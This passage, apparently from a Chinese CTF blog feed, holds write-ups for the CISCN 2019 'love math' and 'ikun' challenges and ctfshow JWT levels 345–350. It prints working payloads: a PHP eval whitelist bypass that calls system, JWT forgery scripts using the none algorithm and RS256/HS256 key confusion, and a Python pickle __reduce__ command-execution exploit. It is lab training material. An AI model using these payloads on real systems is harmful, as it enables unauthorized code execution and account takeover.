&#123;</span><br><span class="hljs-string">            die(&quot;</span>请不要输入奇奇怪怪的字符<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="hljs-string">    <span class="hljs-variable">$whitelist</span> = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="hljs-string">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  </span><br><span class="hljs-string">    foreach (<span class="hljs-variable">$used_funcs</span>[0] as <span class="hljs-variable">$func</span>) &#123;</span><br><span class="hljs-string">        if (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;</span><br><span class="hljs-string">            die(&quot;</span>请不要输入奇奇怪怪的函数<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    //帮你算出答案</span><br><span class="hljs-string">    eval(&#x27;echo &#x27;.<span class="hljs-variable">$content</span>.&#x27;;&#x27;);</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>这题认真学习一下，题目是ciscn-2019的love math 怪不得感觉眼熟</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=20-1<br>回显是19<br></code></pre></td></tr></table></figure><h3 id="0x01-16"><a href="#0x01-16" class="headerlink" title="0x01"></a>0x01</h3><p>已知的是php可以进行嵌套比如说</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$orange=&#x27;system&#x27;;$orange(&#x27;cat /flag&#x27;);<br>实际就是执行system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure><p>所以可以尝试进行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>a和b不能用可以用函数代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[pi])(<span class="hljs-variable">$_GET</span>[abs])&amp;pi=system&amp;abs=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>有个老生常谈的函数hex2bin将十六进制进行转化为ASCII，_GET的十六进制是<code>5f474554</code>,但是也没有hex2bin，也不能填这些但是里面有个函数是<code>base_convert</code>，可以用这个函数构造hex2bin，36进制包含0-9和A-Z,转化为十进制就是<code>37907361743</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">base_convert(37907361743,10,36)  <span class="hljs-comment">#构造出hex2bin</span><br></code></pre></td></tr></table></figure><p>再利用函数<code>dechex</code>函数十进制转化为十六进制<code>1598506324</code>,构造的流程如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">base_convert(37907361743,10,36)(dechex(1598506324));<br>--&gt; hex2bin(dechex(1598506324));<br>--&gt; hex2bin(5f474554);<br>--&gt; _GET<br></code></pre></td></tr></table></figure><p>最后构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="hljs-variable">$pi</span>)&#123;pi&#125;(($<span class="hljs-variable">$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php;<br></code></pre></td></tr></table></figure><p><code>($_GET)&#123;pi&#125;(($_GET)&#123;abs&#125;)</code>然后传入内容执行代码</p><h3 id="0x02-16"><a href="#0x02-16" class="headerlink" title="0x02"></a>0x02</h3><p>原题也可以利用<code>getallheaders</code>,但是本题的环境有些变化</p><h3 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h3><p>先上payload，看看大佬的思路</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-variable">$pi</span>=(is_nan^(6).(4)).(tan^(1).(5));<span class="hljs-variable">$pi</span>=$<span class="hljs-variable">$pi</span>;<span class="hljs-variable">$pi</span>&#123;0&#125;(<span class="hljs-variable">$pi</span>&#123;1&#125;)&amp;0=system&amp;1=<span class="hljs-built_in">tac</span> flag.php;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>,  <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span> , <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=1;<span class="hljs-variable">$k</span>&lt;=sizeof(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = 0;<span class="hljs-variable">$i</span> &lt; 9; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = 0;<span class="hljs-variable">$j</span> &lt;=9;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<br>            <span class="hljs-built_in">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^$i<span class="hljs-variable">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-variable">$exp</span>&quot;</span>);<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个脚本通过异或可以生成很多的字符，拼接最后就可以得到payload涨知识了</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-jwt</title>
    <link href="/2024/09/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-jwt/"/>
    <url>/2024/09/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-jwt/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>打开查看页面源码提示&#x2F;admin&#x2F;，抓包看看有没有东西，发现是jwt，放jwt.io里看一下没有加密方式，那就是简单的base64进行转化，这里利用hackerbar进行发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;None&quot;</span>,<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;jwt&quot;</span>&#125;[&#123;<span class="hljs-string">&quot;iss&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;iat&quot;</span>:1725711082,<span class="hljs-string">&quot;exp&quot;</span>:1725718282,<span class="hljs-string">&quot;nbf&quot;</span>:1725711082,<span class="hljs-string">&quot;sub&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;jti&quot;</span>:<span class="hljs-string">&quot;49c32732a51fddf321b60f8bd4e3b3fd&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>这里把sub的user改成admin，然后再进行base64加密就行，放到原来的地方再发包得到flag</p><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>正常流程用jwt.io检测一下，发现是  “alg”: “HS256”加密，JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。这里直接base64看不了，利用网站，自己脚本编一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>headers=&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>token_dict=&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1725711820</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1725719020</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1725711820</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;db9c8eec3e315880838b4b09ee3d8345&quot;</span><br>&#125;<br>jwt_token= jwt.encode(token_dict,<br>                      <span class="hljs-string">&quot;&quot;</span>,<br>                      algorithm=<span class="hljs-string">&quot;none&quot;</span>,<br>                      headers=headers)<br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure><p>流程和上一题基本一致</p><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>不能直接改了，有弱口令提示，猜测常见的的弱密码，发现结果是123456，改admin，输入弱密码，得到jwt流程基本和前面一致。</p><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>这题标题提示的是爆破，需要利用工具是c-jwt-cracker，去github可以搜到工具，爆破一下得到密钥，剩余流程和之前的差不多</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07204503.png" alt="2024-09-07204503"></p><h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><p>先上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">/* GET home page. */<br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, function(req, res, <span class="hljs-built_in">next</span>) &#123;<br>  res.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  var privateKey = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public//private.key&#x27;</span>);<br>  var token = jwt.sign(&#123; user: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; algorithm: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br>  res.cookie(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.end(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>,function(req,res,<span class="hljs-built_in">next</span>)&#123;<br>var flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>var auth = req.cookies.auth;<br>var cert = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public/public.key&#x27;</span>);  // get public key<br>jwt.verify(auth, cert, function(err, decoded) &#123;<br>  <span class="hljs-keyword">if</span>(decoded.user===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.end(<span class="hljs-string">&#x27;you are not admin&#x27;</span>);<br>  &#125;<br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>这题不一样了，是RS256，可以访问private.key和public.key，会下载密钥和公钥，把公私钥放进去流程也是一样，测试了一下在线网站好像不能直接运行啊，用python写个脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br>private = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;private.key&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>payload = &#123;<br>  <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1725719515</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;RS256&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>token = jwt.encode(payload=payload,<br>                   key=private,<br>                   algorithm=<span class="hljs-string">&quot;RS256&quot;</span>,<br>                   headers=headers)<br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07224432.png" alt="2024-09-07224432"></p><h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><p>和上题大致一样，但是只给了public key,这题需要nodejs跑一下，先上个脚本吧</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">const jwt = require(&#x27;jsonwebtoken&#x27;);<br>var fs = require(&#x27;fs&#x27;);<br><br>var privateKey = fs.readFileSync(&#x27;public.key&#x27;);<br><br>var token = jwt.sign(<span class="hljs-punctuation">&#123;</span> user<span class="hljs-punctuation">:</span> &#x27;admin&#x27; <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> privateKey<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> algorithm<span class="hljs-punctuation">:</span> &#x27;HS256&#x27; <span class="hljs-punctuation">&#125;</span>);<br><br>console.log(token);<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07230802.png" alt="2024-09-07230802"></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07230754.png" alt="2024-09-07230754"></p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>jwt(JSON Web Token)是一串json格式的字符串，由服务端用加密算法对信息签名来保证其完整性和不可伪造。Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT可用于身份认证、会话状态维持、信息交换等。它的出现是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.zhihu.com/?target=https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。</p><p>一个jwt token 由三部分组成，header,payload和signature,以点隔开，类似于<code>orange.apple.banana</code>这个样子</p><ul><li>header用来声明token的类型和签名用的算法等，需要经过base64Url编码，比如</li></ul><p><code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code></p><p>alg表示的是签名的算法，默认是HMAC SHA256(写成HS256)</p><p>typ表示这个令牌的类型，统一写作JWT</p><ul><li>payload用来表示真正的token信息，也需要base64Url编码，比如</li></ul><p><code>&#123;&quot;sub&quot;:&quot;1234567890&quot;,&quot;name&quot;:&quot;orange&quot;,&quot;iat&quot;:1516239022&#125;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">JWT 规定了7个官方字段，供选用<br>iss (issuer)：签发人<br>exp (expiration time)：过期时间<br>sub (subject)：主题<br>aud (audience)：受众<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：编号<br></code></pre></td></tr></table></figure><ul><li>signature，将前两部分用<code>alg</code>指定的算法加密，再经过Base64Url编码就是signature了，作用是防止数据篡改。</li></ul><h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><p>正常使用<a href="https://jwt.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E8%A7%82%E7%9A%84%E4%BA%86%E8%A7%A3header%E5%92%8Cpayload">https://jwt.io/这个网站，可以直观的了解header和payload</a></p><p>爆破secret.key工具<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p><p>我使用的是docker起的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack jwt内容<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019ciscn-ikun</title>
    <link href="/2024/09/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2019ciscn-ikun/"/>
    <url>/2024/09/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2019ciscn-ikun/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2]ikun">在线靶场</a></p><p>一个生成的网站，有提示需要买到Lv6，然后就没有然后了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页</p><p>点击图片看名称，<code>src=&quot;/static/img/lv/lv3.png&quot;</code>写脚本爆一下看看哪页有lv6.png的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://c66eb3e7-b146-49bb-b9c7-e58d5fef7173.node5.buuoj.cn:81/shop?page=&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">300</span>):<br>    response = requests.get(url+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;lv6.png&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>可以在181页找到内容，这里先常规注册一个账号，给了10price</p><img src="/../../images/每日一题/2024-09-04155642.png" alt="2024-09-04155642" style="zoom:50%;"><p>很明显需要尝试改一下内容，购买的时候抓包一下，把discount改的很小就行</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04160139.png" alt="2024-09-04160139"></p><p>然后应该考察的内容是cookie的内容，发现有jwt,用jwt网站看一下内容，修改成admin需要有密钥，用工具可以跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/brendan-rius/c-jwt-cracker.git<br></code></pre></td></tr></table></figure><p>然后根据github上面的要求docker一下就行了，得到了密钥进行修改，将新的jwt修改发包刷新，看到一个压缩包，解压在Admin.py里发现了pickle的moudle,注意到有pickle的利用，在这边进行突破，最后得到flag</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>用分析的脚本搜索，进入?page&#x3D;181,然后点击购买就行抓包，利用jwt修改admin，需要爆破密钥</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04161841.png" alt="2024-09-04161841"></p><p>得到密钥是1Kun，随后修改得到可用的jwt</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04165203.png" alt="2024-09-04165203"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<br></code></pre></td></tr></table></figure><p>修改成为admin,看网页的源码得到下载的<code>www.zip</code>定位到Admin.py里面的pickle,找到关键代码</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04162728.png" alt="2024-09-04162728"></p><p>尝试写利用脚本，这里需要注意的是用python2的环境，而且os.system并不会成功打通，可以使用commands进行利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>orange = exp()<br><br><span class="hljs-built_in">print</span>(urllib.quote(pickle.dumps(orange)))<br></code></pre></td></tr></table></figure><p>先ls找到了flag.txt，然后cat &#x2F;flag.txt，就可以得到flag了</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04164924.png" alt="2024-09-04164924"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XGCTF-Ezzz_php</title>
    <link href="/2024/09/03/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/XGCTF-Ezzz_php/"/>
    <url>/2024/09/03/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/XGCTF-Ezzz_php/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://ctf.show/challenges#Ezzz_php-4404">在线靶场</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span 